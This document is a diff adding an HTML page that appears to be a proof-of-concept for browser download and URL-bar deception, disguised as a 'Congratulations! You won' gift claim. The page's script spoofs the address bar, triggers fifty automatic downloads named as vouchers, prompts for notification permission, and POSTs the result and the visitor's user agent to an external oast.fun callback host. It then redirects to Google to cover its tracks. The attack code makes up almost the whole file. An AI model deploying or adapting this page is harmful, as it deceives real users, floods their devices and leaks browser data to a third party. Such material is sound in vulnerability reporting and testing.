@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Congratulations! You won 🎁</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; margin-top: 100px; }
+    #claim-btn {
+      background: gold; color: black; padding: 20px 40px; font-size: 22px;
+      border: none; border-radius: 8px; cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h1>🎉 CLAIM YOUR REWARD</h1>
+  <p>Click below to confirm & download your gift.</p>
+  <button id="claim-btn">CLAIM NOW</button>
+
+  <script>
+    const claimBtn = document.getElementById('claim-btn');
+
+    claimBtn.addEventListener('click', () => {
+      // 1. Spoof URL bar (optional deception)
+      history.replaceState({}, '', '/secure-confirmation');
+
+      // 2. Perform 50 download using the same user gesture
+      for (let i = 1; i <= 50; i++) {
+        const a = document.createElement('a');
+        a.href = `data:text/html,You downloaded file ${i}`;
+        a.download = `Voucher_${i}.html`; // spoof as pdf if needed
+        document.body.appendChild(a);
+        a.click();
+      }
+
+      // 3. Trigger Notification Prompt Deception
+      setTimeout(() => {
+        Notification.requestPermission().then(permission => {
+          fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/bulk-download-deception', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              permission, ts: Date.now(), ua: navigator.userAgent
+            })
+          });
+        });
+      }, 500);
+
+      // 4. Cloaking after download
+      setTimeout(() => {
+        location.href = "https://www.google.com/search?q=congrats+reward";
+      }, 2500);
+    });
+  </script>
+</body>
+</html>
